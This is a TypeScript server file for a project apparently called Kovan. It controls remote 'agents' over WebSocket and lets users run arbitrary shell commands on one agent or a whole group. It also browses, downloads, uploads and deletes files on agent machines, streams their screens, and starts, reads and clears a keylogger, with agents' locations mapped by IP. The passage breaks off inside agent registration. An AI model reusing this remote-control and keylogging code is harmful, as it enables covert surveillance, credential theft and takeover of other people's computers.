import { Hono } from "hono";
import { cors } from "hono/cors";
import { logger } from "hono/logger";
import { createServer, type IncomingMessage, type ServerResponse } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { readFileSync, existsSync } from "fs";
import { join, extname } from "path";
import { store } from "./store.js";
import { cveRoutes } from "./cve-routes.js";
import { auth } from "./auth.js";
import { permissionRoutes, getPermittedAgentIds } from "./permission-routes.js";
import { performVulnScan } from "./vuln-scan.js";
import { performNetworkScan } from "./network-scan.js";
import { alertRoutes } from "./alert-routes.js";
import { checkMetricsAlerts, checkOfflineAlert, checkCveAlert } from "./alert-engine.js";
import { scheduleRoutes } from "./schedule-routes.js";
import { startScheduler } from "./scheduler.js";
import { lookupBatch, type GeoLocation } from "./geoip.js";
import "./db.js"; // DB connection init
import {
  loadAgentsFromDB,
  findAgentByFingerprint,
  findAgentByMachineId,
  findAgentByMac,
  upsertAgent,
  updateAgentStatus,
  updateAgentAlias as updateAgentAliasDB,
  updateAgentGroup as updateAgentGroupDB,
  deleteAgentFromDB,
} from "./agent-db.js";
import type {
  Agent,
  Command,
  WSMessage,
  RegisterData,
  ResultData,
  FileListResponse,
  FileDownloadResponse,
  FileUploadResponse,
  FileDeleteResponse,
  FileMoveResponse,
  FileCopyResponse,
} from "@kovan/shared";

// Vuln scan bekleyen komut ID'leri → agentId mapping
const pendingVulnScans = new Map<string, string>(); // commandId -> agentId
const pendingNetworkScans = new Map<string, string>(); // commandId -> agentId

const PORT = Number(process.env.PORT) || 4444;

const app = new Hono();

// ===== Middleware =====
app.use("*", logger());
app.use("/api/*", cors({
  origin: ["http://localhost:5173", "http://localhost:4444"],
  credentials: true,
  allowHeaders: ["Content-Type", "Authorization"],
  allowMethods: ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
}));

// ===== Better Auth =====
app.on(["POST", "GET"], "/api/auth/*", (c) => auth.handler(c.req.raw));

// ===== Auth Middleware — protect agent/command routes =====
const protectedPaths = ["/api/agents", "/api/command", "/api/commands", "/api/groups", "/api/schedules", "/api/geoip", "/api/terminal"];
app.use("/api/*", async (c, next) => {
  const path = c.req.path;
  // Skip auth for health, cves, auth routes, permissions, alerts/settings (has own middleware)
  if (
    path === "/api/health" ||
    path.startsWith("/api/cves") ||
    path.startsWith("/api/auth") ||
    path.startsWith("/api/permissions") ||
    path.startsWith("/api/settings") ||
    path.startsWith("/api/alerts")
  ) {
    return next();
  }
  const needsAuth = protectedPaths.some((p) => path === p || path.startsWith(p + "/"));
  if (!needsAuth) return next();

  const session = await auth.api.getSession({ headers: c.req.raw.headers });
  if (!session) return c.json({ success: false, error: "Unauthorized" }, 401);
  c.set("user" as never, session.user as never);
  c.set("session" as never, session.session as never);
  await next();
});

// ===== REST API =====

app.get("/api/health", (c) =>
  c.json({ status: "ok", name: "Kovan Server" })
);

// ===== CVE Routes =====
app.route("/api/cves", cveRoutes);

// ===== Permission Routes =====
app.route("/api/permissions", permissionRoutes);

// ===== Alert Routes =====
app.route("/api", alertRoutes);

// ===== Schedule Routes =====
app.route("/api/schedules", scheduleRoutes);

// ===== GeoIP Routes =====
app.get("/api/geoip/agents", async (c) => {
  const user = c.get("user" as never) as any;
  let agents = store.getAllAgents();

  if (user.role !== "admin") {
    const permitted = await getPermittedAgentIds(user.id);
    agents = agents.filter((a) => permitted.includes(a.id));
  }

  // Collect unique IPs
  const ips = [...new Set(agents.map((a) => a.ip).filter(Boolean))];
  const geoMap = await lookupBatch(ips);

  // Build response: agent info + geo data
  const agentGeoData = agents.map((a) => {
    const geo = geoMap.get(a.ip) || null;
    return {
      id: a.id,
      hostname: a.hostname,
      alias: a.alias,
      ip: a.ip,
      os: a.os,
      username: a.username,
      isOnline: a.isOnline,
      lastSeen: a.lastSeen,
      group: a.group,
      geo: geo
        ? {
            country: geo.country,
            countryCode: geo.countryCode,
            region: geo.region,
            city: geo.city,
            lat: geo.lat,
            lon: geo.lon,
            isp: geo.isp,
            org: geo.org,
            timezone: geo.timezone,
          }
        : null,
    };
  });

  // Build stats
  const countryStats: Record<string, { count: number; online: number; agents: string[] }> = {};
  const cityStats: Record<string, { count: number; online: number; country: string }> = {};

  for (const ag of agentGeoData) {
    if (!ag.geo) continue;
    const c = ag.geo.country;
    const city = `${ag.geo.city}, ${ag.geo.countryCode}`;
    if (!countryStats[c]) countryStats[c] = { count: 0, online: 0, agents: [] };
    countryStats[c].count++;
    if (ag.isOnline) countryStats[c].online++;
    countryStats[c].agents.push(ag.id);

    if (!cityStats[city]) cityStats[city] = { count: 0, online: 0, country: c };
    cityStats[city].count++;
    if (ag.isOnline) cityStats[city].online++;
  }

  return c.json({
    success: true,
    agents: agentGeoData,
    stats: {
      totalAgents: agents.length,
      onlineAgents: agents.filter((a) => a.isOnline).length,
      countries: Object.entries(countryStats)
        .map(([name, s]) => ({ name, ...s }))
        .sort((a, b) => b.count - a.count),
      cities: Object.entries(cityStats)
        .map(([name, s]) => ({ name, ...s }))
        .sort((a, b) => b.count - a.count),
    },
  });
});

// Helper: check if user can access an agent
async function canAccessAgent(user: any, agentId: string): Promise<boolean> {
  if (user.role === "admin") return true;
  const permitted = await getPermittedAgentIds(user.id);
  return permitted.includes(agentId);
}

app.get("/api/agents", async (c) => {
  const user = c.get("user" as never) as any;
  let agents = store.getAllAgents();

  if (user.role !== "admin") {
    const permitted = await getPermittedAgentIds(user.id);
    agents = agents.filter((a) => permitted.includes(a.id));
  }

  return c.json({ success: true, agents, count: agents.length });
});

app.get("/api/agents/:id", async (c) => {
  const user = c.get("user" as never) as any;
  const agent = store.getAgent(c.req.param("id"));
  if (!agent) return c.json({ success: false, error: "Agent bulunamadı" }, 404);
  if (!(await canAccessAgent(user, agent.id))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }
  return c.json({ success: true, agent });
});

// Get agent metrics history
app.get("/api/agents/:id/metrics", async (c) => {
  const user = c.get("user" as never) as any;
  const agentId = c.req.param("id");
  if (!(await canAccessAgent(user, agentId))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }
  const agent = store.getAgent(agentId);
  if (!agent) return c.json({ success: false, error: "Agent bulunamadı" }, 404);

  const limitParam = c.req.query("limit");
  const limit = limitParam ? parseInt(limitParam) : undefined;
  const metrics = store.getMetrics(agentId, limit);
  const latest = metrics.length > 0 ? metrics[metrics.length - 1] : null;

  return c.json({ success: true, metrics, latest, count: metrics.length });
});

// Rename agent (set alias)
app.patch("/api/agents/:id", async (c) => {
  const user = c.get("user" as never) as any;
  const id = c.req.param("id");
  if (!(await canAccessAgent(user, id))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }
  const agent = store.getAgent(id);
  if (!agent) return c.json({ success: false, error: "Agent bulunamadı" }, 404);

  const body = await c.req.json<{ alias?: string; group?: string }>();

  // alias güncelleme
  if (typeof body.alias === "string") {
    store.renameAgent(id, body.alias.trim());
    try { await updateAgentAliasDB(id, body.alias.trim() || null); } catch {}
  }

  // group güncelleme
  if (typeof body.group === "string") {
    store.setAgentGroup(id, body.group.trim());
    try { await updateAgentGroupDB(id, body.group.trim() || null); } catch {}
  }

  if (typeof body.alias !== "string" && typeof body.group !== "string") {
    return c.json({ success: false, error: "alias veya group (string) gerekli" }, 400);
  }

  return c.json({ success: true, agent: store.getAgent(id) });
});

// Get all groups with agent counts
app.get("/api/groups", async (c) => {
  const groups = store.getAllGroups();
  const allAgents = store.getAllAgents();
  const details = groups.map((name) => {
    const members = allAgents.filter((a) => a.group === name);
    return {
      name,
      total: members.length,
      online: members.filter((a) => a.isOnline).length,
    };
  });
  return c.json({ success: true, groups: details });
});

// Create a group (persists even without agents)
app.post("/api/groups", async (c) => {
  const body = await c.req.json<{ name: string }>();
  if (!body.name?.trim()) {
    return c.json({ success: false, error: "name gerekli" }, 400);
  }
  store.addGroup(body.name.trim());
  return c.json({ success: true, message: `Grup "${body.name.trim()}" oluşturuldu` });
});

// Delete a group
app.delete("/api/groups/:name", async (c) => {
  const user = c.get("user" as never) as any;
  if (user.role !== "admin") {
    return c.json({ success: false, error: "Admin only" }, 403);
  }
  const name = decodeURIComponent(c.req.param("name"));
  store.deleteGroup(name);
  return c.json({ success: true, message: `Grup "${name}" silindi` });
});

// Broadcast command to a group
app.post("/api/groups/broadcast", async (c) => {
  const user = c.get("user" as never) as any;
  const body = await c.req.json<{ group: string; command: string }>();

  if (!body.group || !body.command) {
    return c.json({ success: false, error: "group ve command gerekli" }, 400);
  }

  const groupAgents = store.getAgentsByGroup(body.group);
  if (groupAgents.length === 0) {
    return c.json({ success: false, error: "Bu grupta agent yok" }, 404);
  }

  // Yetki kontrolü: admin tüm agentlara erişebilir, normal kullanıcı sadece izinli olanlara
  let permittedAgents = groupAgents;
  if (user.role !== "admin") {
    const permitted = await getPermittedAgentIds(user.id);
    permittedAgents = groupAgents.filter((a) => permitted.includes(a.id));
    if (permittedAgents.length === 0) {
      return c.json({ success: false, error: "Bu gruptaki hiçbir agenta yetkiniz yok" }, 403);
    }
  }

  const results: { agentId: string; hostname: string; success: boolean; commandId?: string; error?: string }[] = [];

  for (const agent of permittedAgents) {
    if (!agent.isOnline) {
      results.push({ agentId: agent.id, hostname: agent.alias || agent.hostname, success: false, error: "Çevrimdışı" });
      continue;
    }

    const conn = store.getConn(agent.id);
    if (!conn || conn.readyState !== WebSocket.OPEN) {
      results.push({ agentId: agent.id, hostname: agent.alias || agent.hostname, success: false, error: "Bağlantı yok" });
      continue;
    }

    const cmd: Command = {
      id: crypto.randomUUID().slice(0, 8),
      agentId: agent.id,
      command: body.command,
      status: "pending",
      output: "",
      sentAt: new Date().toISOString(),
    };
    store.addCommand(cmd);

    const wsMsg: WSMessage = {
      type: "command",
      agentId: agent.id,
      data: { commandId: cmd.id, command: body.command },
    };
    conn.send(JSON.stringify(wsMsg));
    cmd.status = "running";

    results.push({ agentId: agent.id, hostname: agent.alias || agent.hostname, success: true, commandId: cmd.id });
  }

  const sent = results.filter((r) => r.success).length;
  return c.json({ success: true, message: `${sent}/${permittedAgents.length} agenta komut gönderildi`, results });
});

app.get("/api/agents/:id/commands", async (c) => {
  const user = c.get("user" as never) as any;
  const agentId = c.req.param("id");
  if (!(await canAccessAgent(user, agentId))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }
  const commands = store.getCommandsByAgent(agentId);
  return c.json({ success: true, commands, count: commands.length });
});

// Delete an agent and all its commands (admin only)
app.delete("/api/agents/:id", async (c) => {
  const user = c.get("user" as never) as any;
  if (user.role !== "admin") {
    return c.json({ success: false, error: "Admin only" }, 403);
  }
  const id = c.req.param("id");
  const deleted = store.deleteAgent(id);
  if (!deleted) return c.json({ success: false, error: "Agent bulunamadı" }, 404);
  try { await deleteAgentFromDB(id); } catch {}
  return c.json({ success: true, message: "Agent silindi" });
});

// Clear command history for an agent
app.delete("/api/agents/:id/commands", async (c) => {
  const user = c.get("user" as never) as any;
  const agentId = c.req.param("id");
  if (!(await canAccessAgent(user, agentId))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }
  const agent = store.getAgent(agentId);
  if (!agent) return c.json({ success: false, error: "Agent bulunamadı" }, 404);
  const count = store.clearCommandsByAgent(agentId);
  return c.json({ success: true, message: `${count} komut silindi`, count });
});

// ===== Vulnerability Scan Endpoints =====

// Trigger a vuln scan on an agent (sends dpkg -l)
app.post("/api/agents/:id/vuln-scan", async (c) => {
  const user = c.get("user" as never) as any;
  const agentId = c.req.param("id");

  if (!(await canAccessAgent(user, agentId))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }

  const agent = store.getAgent(agentId);
  if (!agent) return c.json({ success: false, error: "Agent bulunamadı" }, 404);
  if (!agent.isOnline) return c.json({ success: false, error: "Agent çevrimdışı" }, 400);

  const conn = store.getConn(agentId);
  if (!conn || conn.readyState !== WebSocket.OPEN) {
    return c.json({ success: false, error: "Agent bağlantısı yok" }, 500);
  }

  // Determine package list command based on OS
  const isWin = agent.os.toLowerCase().includes("win");
  const pkgCommand = isWin
    ? 'powershell -Command "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion | Format-Table -AutoSize"'
    : "dpkg -l 2>/dev/null || rpm -qa --queryformat '%{NAME} %{VERSION}-%{RELEASE}\\n' 2>/dev/null";

  const cmd: Command = {
    id: crypto.randomUUID().slice(0, 8),
    agentId,
    command: pkgCommand,
    status: "pending",
    output: "",
    sentAt: new Date().toISOString(),
  };
  store.addCommand(cmd);

  // Bu komut ID'sini vuln scan olarak işaretle
  pendingVulnScans.set(cmd.id, agentId);

  // Set initial scanning state
  store.setVulnScan(agentId, {
    agentId,
    status: "scanning",
    startedAt: new Date().toISOString(),
    scanned: 0,
    vulnerabilities: [],
    summary: { total: 0, critical: 0, high: 0, medium: 0, low: 0 },
  });

  const wsMsg: WSMessage = {
    type: "command",
    agentId,
    data: { commandId: cmd.id, command: pkgCommand },
  };
  conn.send(JSON.stringify(wsMsg));
  cmd.status = "running";

  return c.json({ success: true, message: "Zafiyet taraması başlatıldı", commandId: cmd.id });
});

// Get last vuln scan result for an agent
app.get("/api/agents/:id/vuln-scan", async (c) => {
  const user = c.get("user" as never) as any;
  const agentId = c.req.param("id");

  if (!(await canAccessAgent(user, agentId))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }

  const scan = store.getVulnScan(agentId);
  if (!scan) {
    return c.json({ success: true, scan: null, message: "Henüz tarama yapılmadı" });
  }

  return c.json({ success: true, scan });
});

// ===== Network Anomaly Scan Endpoints =====

// Trigger a network scan on an agent (sends ss -tnpi)
app.post("/api/agents/:id/network-scan", async (c) => {
  const user = c.get("user" as never) as any;
  const agentId = c.req.param("id");

  if (!(await canAccessAgent(user, agentId))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }

  const agent = store.getAgent(agentId);
  if (!agent) return c.json({ success: false, error: "Agent bulunamadı" }, 404);
  if (!agent.isOnline) return c.json({ success: false, error: "Agent çevrimdışı" }, 400);

  const conn = store.getConn(agentId);
  if (!conn || conn.readyState !== WebSocket.OPEN) {
    return c.json({ success: false, error: "Agent bağlantısı yok" }, 500);
  }

  // ss -tnpi: TCP, numeric, process, internal info
  const isWin = agent.os.toLowerCase().includes("win");
  const netCommand = isWin
    ? "netstat -anob"
    : "ss -tnpi";

  const cmd: Command = {
    id: crypto.randomUUID().slice(0, 8),
    agentId,
    command: netCommand,
    status: "pending",
    output: "",
    sentAt: new Date().toISOString(),
  };
  store.addCommand(cmd);

  // Bu komut ID'sini network scan olarak işaretle
  pendingNetworkScans.set(cmd.id, agentId);

  // Scanning state kaydet
  store.setNetworkScan(agentId, {
    agentId,
    status: "scanning",
    startedAt: new Date().toISOString(),
    connections: [],
    summary: { total: 0, critical: 0, high: 0, medium: 0, low: 0, mean_score: 0, max_score: 0 },
  });

  const wsMsg: WSMessage = {
    type: "command",
    agentId,
    data: { commandId: cmd.id, command: netCommand },
  };
  conn.send(JSON.stringify(wsMsg));
  cmd.status = "running";

  return c.json({ success: true, message: "Ağ analizi başlatıldı", commandId: cmd.id });
});

// Get last network scan result
app.get("/api/agents/:id/network-scan", async (c) => {
  const user = c.get("user" as never) as any;
  const agentId = c.req.param("id");

  if (!(await canAccessAgent(user, agentId))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }

  const scan = store.getNetworkScan(agentId);
  if (!scan) {
    return c.json({ success: true, scan: null, message: "Henüz ağ taraması yapılmadı" });
  }

  return c.json({ success: true, scan });
});

// ===== File Manager Endpoints =====

// Helper: send file request to agent and wait for response
async function fileRequest(agentId: string, type: string, data: any, timeout = 15000): Promise<any> {
  const conn = store.getConn(agentId);
  if (!conn || conn.readyState !== WebSocket.OPEN) {
    throw new Error("Agent bağlantısı yok");
  }
  const requestId = crypto.randomUUID().slice(0, 8);
  const promise = store.addFileRequest(requestId, timeout);
  conn.send(JSON.stringify({ type, agentId, data: { ...data, requestId } }));
  return promise;
}

// List directory
app.post("/api/agents/:id/files/list", async (c) => {
  const user = c.get("user" as never) as any;
  const agentId = c.req.param("id");
  if (!(await canAccessAgent(user, agentId))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }
  const agent = store.getAgent(agentId);
  if (!agent) return c.json({ success: false, error: "Agent bulunamadı" }, 404);
  if (!agent.isOnline) return c.json({ success: false, error: "Agent çevrimdışı" }, 400);

  const body = await c.req.json<{ path: string }>();
  try {
    const result = await fileRequest(agentId, "file_list", { path: body.path || "" });
    if (result.error) return c.json({ success: false, error: result.error }, 400);
    return c.json({ success: true, path: result.path, entries: result.entries });
  } catch (err: any) {
    return c.json({ success: false, error: err.message }, 500);
  }
});

// Download file
app.post("/api/agents/:id/files/download", async (c) => {
  const user = c.get("user" as never) as any;
  const agentId = c.req.param("id");
  if (!(await canAccessAgent(user, agentId))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }
  const agent = store.getAgent(agentId);
  if (!agent) return c.json({ success: false, error: "Agent bulunamadı" }, 404);
  if (!agent.isOnline) return c.json({ success: false, error: "Agent çevrimdışı" }, 400);

  const body = await c.req.json<{ path: string }>();
  try {
    const result = await fileRequest(agentId, "file_download", { path: body.path }, 60000);
    if (result.error) return c.json({ success: false, error: result.error }, 400);
    return c.json({ success: true, fileName: result.fileName, data: result.data, size: result.size });
  } catch (err: any) {
    return c.json({ success: false, error: err.message }, 500);
  }
});

// Upload file
app.post("/api/agents/:id/files/upload", async (c) => {
  const user = c.get("user" as never) as any;
  const agentId = c.req.param("id");
  if (!(await canAccessAgent(user, agentId))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }
  const agent = store.getAgent(agentId);
  if (!agent) return c.json({ success: false, error: "Agent bulunamadı" }, 404);
  if (!agent.isOnline) return c.json({ success: false, error: "Agent çevrimdışı" }, 400);

  const body = await c.req.json<{ path: string; data: string }>();
  try {
    const result = await fileRequest(agentId, "file_upload", { path: body.path, data: body.data });
    if (result.error) return c.json({ success: false, error: result.error }, 400);
    return c.json({ success: true });
  } catch (err: any) {
    return c.json({ success: false, error: err.message }, 500);
  }
});

// Delete file/directory
app.post("/api/agents/:id/files/delete", async (c) => {
  const user = c.get("user" as never) as any;
  const agentId = c.req.param("id");
  if (!(await canAccessAgent(user, agentId))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }
  const agent = store.getAgent(agentId);
  if (!agent) return c.json({ success: false, error: "Agent bulunamadı" }, 404);
  if (!agent.isOnline) return c.json({ success: false, error: "Agent çevrimdışı" }, 400);

  const body = await c.req.json<{ path: string }>();
  try {
    const result = await fileRequest(agentId, "file_delete", { path: body.path });
    if (result.error) return c.json({ success: false, error: result.error }, 400);
    return c.json({ success: true });
  } catch (err: any) {
    return c.json({ success: false, error: err.message }, 500);
  }
});

// Move/rename file
app.post("/api/agents/:id/files/move", async (c) => {
  const user = c.get("user" as never) as any;
  const agentId = c.req.param("id");
  if (!(await canAccessAgent(user, agentId))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }
  const agent = store.getAgent(agentId);
  if (!agent) return c.json({ success: false, error: "Agent bulunamadı" }, 404);
  if (!agent.isOnline) return c.json({ success: false, error: "Agent çevrimdışı" }, 400);

  const body = await c.req.json<{ source: string; destination: string }>();
  try {
    const result = await fileRequest(agentId, "file_move", { source: body.source, destination: body.destination });
    if (result.error) return c.json({ success: false, error: result.error }, 400);
    return c.json({ success: true });
  } catch (err: any) {
    return c.json({ success: false, error: err.message }, 500);
  }
});

// Copy file
app.post("/api/agents/:id/files/copy", async (c) => {
  const user = c.get("user" as never) as any;
  const agentId = c.req.param("id");
  if (!(await canAccessAgent(user, agentId))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }
  const agent = store.getAgent(agentId);
  if (!agent) return c.json({ success: false, error: "Agent bulunamadı" }, 404);
  if (!agent.isOnline) return c.json({ success: false, error: "Agent çevrimdışı" }, 400);

  const body = await c.req.json<{ source: string; destination: string }>();
  try {
    const result = await fileRequest(agentId, "file_copy", { source: body.source, destination: body.destination });
    if (result.error) return c.json({ success: false, error: result.error }, 400);
    return c.json({ success: true });
  } catch (err: any) {
    return c.json({ success: false, error: err.message }, 500);
  }
});

// ===== Screen Streaming =====
const screenViewers = new Map<string, Set<WebSocket>>();   // agentId -> viewer WS'ler
const activeScreenSessions = new Set<string>();

app.post("/api/agents/:id/screen/start", async (c) => {
  const user = c.get("user" as never) as any;
  const agentId = c.req.param("id");

  if (!(await canAccessAgent(user, agentId))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }

  const agent = store.getAgent(agentId);
  if (!agent) return c.json({ success: false, error: "Agent bulunamadı" }, 404);
  if (!agent.isOnline) return c.json({ success: false, error: "Agent çevrimdışı" }, 400);

  const conn = store.getConn(agentId);
  if (!conn || conn.readyState !== WebSocket.OPEN) {
    return c.json({ success: false, error: "Agent bağlantısı yok" }, 500);
  }

  const body = await c.req.json<{ fps?: number; quality?: number }>().catch(() => ({}));

  conn.send(JSON.stringify({ type: "screen_start", agentId, data: { fps: body.fps || 5, quality: body.quality || 40 } }));
  activeScreenSessions.add(agentId);

  return c.json({ success: true, message: "Ekran akışı başlatılıyor..." });
});

app.post("/api/agents/:id/screen/stop", async (c) => {
  const user = c.get("user" as never) as any;
  const agentId = c.req.param("id");

  if (!(await canAccessAgent(user, agentId))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }

  const conn = store.getConn(agentId);
  if (conn && conn.readyState === WebSocket.OPEN) {
    conn.send(JSON.stringify({ type: "screen_stop", agentId }));
  }

  activeScreenSessions.delete(agentId);
  // Viewer'ları bilgilendir ve kapat
  const viewers = screenViewers.get(agentId);
  if (viewers) {
    for (const v of viewers) {
      v.send(JSON.stringify({ type: "screen_stopped" }));
      v.close();
    }
    screenViewers.delete(agentId);
  }

  return c.json({ success: true, message: "Ekran akışı durduruldu" });
});

app.get("/api/agents/:id/screen/status", async (c) => {
  const user = c.get("user" as never) as any;
  const agentId = c.req.param("id");

  if (!(await canAccessAgent(user, agentId))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }

  return c.json({
    success: true,
    active: activeScreenSessions.has(agentId),
    viewerCount: screenViewers.get(agentId)?.size || 0,
  });
});

// ===== Keylogger Endpoints =====

app.post("/api/agents/:id/keylog/start", async (c) => {
  const user = c.get("user" as never) as any;
  const agentId = c.req.param("id");

  if (!(await canAccessAgent(user, agentId))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }

  const agent = store.getAgent(agentId);
  if (!agent) return c.json({ success: false, error: "Agent bulunamadı" }, 404);
  if (!agent.isOnline) return c.json({ success: false, error: "Agent çevrimdışı" }, 400);

  const conn = store.getConn(agentId);
  if (!conn || conn.readyState !== WebSocket.OPEN) {
    return c.json({ success: false, error: "Agent bağlantısı yok" }, 500);
  }

  store.clearKeylogError(agentId);
  conn.send(JSON.stringify({ type: "keylog_start", agentId, data: {} }));
  return c.json({ success: true, message: "Keylogger başlatılıyor..." });
});

app.post("/api/agents/:id/keylog/stop", async (c) => {
  const user = c.get("user" as never) as any;
  const agentId = c.req.param("id");

  if (!(await canAccessAgent(user, agentId))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }

  const conn = store.getConn(agentId);
  if (conn && conn.readyState === WebSocket.OPEN) {
    conn.send(JSON.stringify({ type: "keylog_stop", agentId }));
  }

  store.setKeylogActive(agentId, false);
  return c.json({ success: true, message: "Keylogger durduruldu" });
});

app.get("/api/agents/:id/keylog", async (c) => {
  const user = c.get("user" as never) as any;
  const agentId = c.req.param("id");

  if (!(await canAccessAgent(user, agentId))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }

  const limitParam = c.req.query("limit");
  const sinceParam = c.req.query("since");
  const limit = limitParam ? parseInt(limitParam) : undefined;
  const since = sinceParam ? parseInt(sinceParam) : undefined;

  const events = store.getKeylogEvents(agentId, limit, since);
  const active = store.isKeylogActive(agentId);
  const error = store.getKeylogError(agentId);

  return c.json({ success: true, events, count: events.length, active, error });
});

app.get("/api/agents/:id/keylog/status", async (c) => {
  const user = c.get("user" as never) as any;
  const agentId = c.req.param("id");

  if (!(await canAccessAgent(user, agentId))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }

  return c.json({
    success: true,
    active: store.isKeylogActive(agentId),
    eventCount: store.getKeylogEvents(agentId).length,
    error: store.getKeylogError(agentId),
  });
});

app.delete("/api/agents/:id/keylog", async (c) => {
  const user = c.get("user" as never) as any;
  const agentId = c.req.param("id");

  if (!(await canAccessAgent(user, agentId))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }

  store.clearKeylog(agentId);
  return c.json({ success: true, message: "Keylog verileri temizlendi" });
});

app.get("/api/commands", (c) => {
  const commands = store.getAllCommands();
  return c.json({ success: true, commands, count: commands.length });
});

app.post("/api/command", async (c) => {
  const user = c.get("user" as never) as any;
  const body = await c.req.json<{ agent_id: string; command: string }>();

  if (!body.agent_id || !body.command) {
    return c.json({ success: false, error: "agent_id ve command gerekli" }, 400);
  }

  if (!(await canAccessAgent(user, body.agent_id))) {
    return c.json({ success: false, error: "Bu agent için yetkiniz yok" }, 403);
  }

  const agent = store.getAgent(body.agent_id);
  if (!agent) return c.json({ success: false, error: "Agent bulunamadı" }, 404);
  if (!agent.isOnline)
    return c.json({ success: false, error: "Agent çevrimdışı" }, 400);

  const conn = store.getConn(body.agent_id);
  if (!conn || conn.readyState !== WebSocket.OPEN) {
    return c.json({ success: false, error: "Agent bağlantısı yok" }, 500);
  }

  const cmd: Command = {
    id: crypto.randomUUID().slice(0, 8),
    agentId: body.agent_id,
    command: body.command,
    status: "pending",
    output: "",
    sentAt: new Date().toISOString(),
  };
  store.addCommand(cmd);

  const wsMsg: WSMessage = {
    type: "command",
    agentId: body.agent_id,
    data: { commandId: cmd.id, command: body.command },
  };
  conn.send(JSON.stringify(wsMsg));
  cmd.status = "running";

  return c.json({ success: true, command: cmd });
});

// ===== Static file serving (frontend/dist) =====
const MIME: Record<string, string> = {
  ".html": "text/html",
  ".js": "application/javascript",
  ".css": "text/css",
  ".json": "application/json",
  ".png": "image/png",
  ".svg": "image/svg+xml",
  ".ico": "image/x-icon",
};

function serveStaticFile(filePath: string): Response | null {
  const distDir = join(import.meta.dirname ?? ".", "..", "frontend", "dist");
  const full = join(distDir, filePath);
  if (!existsSync(full)) return null;
  try {
    const content = readFileSync(full);
    const ext = extname(full);
    return new Response(content, {
      headers: { "Content-Type": MIME[ext] || "application/octet-stream" },
    });
  } catch {
    return null;
  }
}

app.get("*", (c) => {
  const path = c.req.path;
  if (path.startsWith("/api") || path.startsWith("/ws")) {
    return c.json({ error: "Not found" }, 404);
  }
  const file = serveStaticFile(path === "/" ? "index.html" : path.slice(1));
  if (file) return file;
  const index = serveStaticFile("index.html");
  if (index) return index;
  return c.json({ error: "Not found" }, 404);
});

// ===== WebSocket helpers =====
function generateId(): string {
  return crypto.randomUUID().slice(0, 8);
}

function isPrivateIP(ip: string): boolean {
  if (!ip || ip === "unknown") return true;
  if (ip === "127.0.0.1" || ip === "::1" || ip === "localhost") return true;
  if (ip.startsWith("10.")) return true;
  if (ip.startsWith("172.")) {
    const second = parseInt(ip.split(".")[1]);
    if (second >= 16 && second <= 31) return true;
  }
  if (ip.startsWith("192.168.")) return true;
  if (ip.startsWith("169.254.")) return true;
  return false;
}

async function handleRegister(ws: WebSocket, data: RegisterData, remoteIP?: string): Promise<string> {
  let agentId = "";

  // 1) Önce in-memory store'da ara (hızlı yol)
  if (data.fingerprint) {
    for (const a of store.getAllAgents()) {
      if (a.fingerprint && a.fingerprint === data.fingerprint) {
        agentId = a.id;
        break;
      }
    }
  }
  if (!agentId) {
    for (const a of store.getAllAgents()) {
      if (data.machineId && data.machineId !== "unknown" && a.machineId === data.machineId) {
        agentId = a.id;
        break;
      }
      if (data.mac && data.mac !== "unknown" && a.mac === data.mac) {
        agentId = a.id;
        break;
      }
    }
  }

  // 2) Memory'de bulamadıysak DB'den ara (server restart sonrası)
  if (!agentId && data.fingerprint && data.fingerprint !== "unknown") {
    try {
      agentId = (await findAgentByFingerprint(data.fingerprint)) || "";
    } catch (err) {
      console.error("[WS] DB fingerprint sorgusu hatası:", err);
    }
  }
  if (!agentId && data.machineId && data.machineId !== "unknown") {
    try {
      agentId = (await findAgentByMachineId(data.machineId)) || "";
    } catch (err) {
      console.error("[WS] DB machineId sorgusu hatası:", err);
    }
  }
  if (!agentId && data.mac && data.mac !== "unknown") {
    try {
      agentId = (await findAgentByMac(data.mac)) || "";
    } catch (err) {
      console.error("[WS] DB mac sorgusu hatası:", err);
    }
  }

  if (!agentId) agentId = generateId();

  const existing = store.getAgent(agentId);
  const now = new Date().toISOString();
  const agent: Agent = {
    id: agentId,
    hostname: data.hostname,
    alias: existing?.alias,  // mevcut alias'ı koru
    group: existing?.group, // mevcut grubu koru
    os: data.os,
    ip: (isPrivateIP(data.ip) && remoteIP && !isPrivateIP(remoteIP)) ? remoteIP : data.ip,
    username: data.username,
    machineId: data.machineId || "unknown",
    mac: data.mac || "unknown",
    cpuModel: data.cpuModel || "unknown",
    totalMemMB: data.totalMemMB || 0,
    fingerprint: data.fingerprint || "unknown",
    firstSeen: existing?.firstSeen || now,
    lastSeen: now,
    isOnline: true,
  };
  store.addAgent(agent);
  store.setConn(agentId, ws);

  // DB'ye kalıcı kaydet
  try {
